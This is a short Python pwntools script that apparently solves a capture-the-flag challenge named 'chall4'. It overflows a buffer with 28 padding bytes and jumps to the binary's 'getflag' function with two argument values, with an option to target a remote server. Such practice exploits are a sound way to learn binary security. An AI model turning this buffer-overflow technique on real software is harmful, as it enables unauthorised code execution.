from pwn import *


elf =context.binary = ELF('./chall4')


def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript='')
    else:
        if args.REMOTE:
            return remote('207.154.255.198',6666)
        else:
            return process()    
    

offset =28


p = start()

pay =flat(
    b'a'*offset,
    elf.sym['getflag'], 
    0x0,
    0xdeadbeef,
    0xc0debabe
    
)

p.sendline(pay)

p.interactive()
